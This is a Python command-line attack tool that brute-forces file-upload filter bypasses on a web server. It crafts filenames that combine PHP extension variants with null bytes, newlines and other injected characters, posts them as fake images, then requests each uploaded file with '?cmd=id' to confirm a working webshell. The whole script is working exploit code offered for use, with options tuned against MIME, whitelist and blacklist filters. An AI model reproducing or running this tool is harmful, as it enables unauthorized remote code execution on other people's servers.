from optparse import *
from pwn import *   
import  requests, subprocess, sys

def pwn_start():
    log.info('Webshell payloads')
    return log.progress('Using payload')

def payload_creator(deepth,c,j,extention):
    payload = f'{c}{j}{c}'
    if deepth == 1:
        return f'shell{payload}.{extention}'
    elif deepth == 2:
        return f'shell{payload}.{extention}{payload}'
    else:
        return f'shell{payload}.{extention}{payload}.{extention}'
def request(char,phpext,target,post,get,deepth,file_upload,extention):
    try:
        for c in char:
            for j in phpext:
                payload = payload_creator(deepth,c,j,extention[1])
                postreq = f'http://{target}/{post}'
                getreq = f'http://{target}/{get}/{payload}?cmd=id'
                files = {'uploadFile':(payload,open(file_upload, 'rb'),'image/jpg')}
                post_req = requests.post(postreq,files=files)
                get_req = requests.get(getreq)
                status = get_req.status_code
                progress.status(f'{getreq} -> {status}')
                
                if status == 200:
                    print(f'Payload: {payload}')
                    print(f'Status: {status}')
                    print(f'Content: {get_req.text}\n')
    except:
        print('\nAn error ocurred...\n')
        parser.print_help()

usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser()
parser.add_option("-t", "--target", action="store", type="str", dest="target",help="Set the target url (use it without 'http://')")
parser.add_option("-p", "--post", action="store", type="str", dest="post",help="Post request path url (e.g. /upload.php)")
parser.add_option("-g", "--get", action="store", type="str", dest="get",help="Get request path url (e.g. /profile_image/)")
parser.add_option("-d", "--deepth", action="store", type="int", dest="deep", default=1,help="More injections added in the payload. Recommended against types, MIME, whitelist and blacklist filters (1, 2 or 3 -> -d 1 or -d 2 // Default = 1)")
parser.add_option("-f", "--file", action="store", type="str", dest="file", default=1,help="File to use in the upload")

(options, args) = parser.parse_args()

target = options.target
post = options.post
get = options.get
deepth = options.deep
file_upload = options.file
extention = file_upload.split('.')

char = ('', '%20', '%0a', '%00', '%0d0a', '/', '.\\', '.', '…', ':')
phpext = ('.php', '.phps', '.php3', '.php4', '.phtml', '.pht', '.pHp', '.phpt', '.phar', '.phtm', '.php5', '.php6', '.php7', '.php8')

progress = pwn_start()
request(char,phpext,target,post,get,deepth,file_upload,extention)
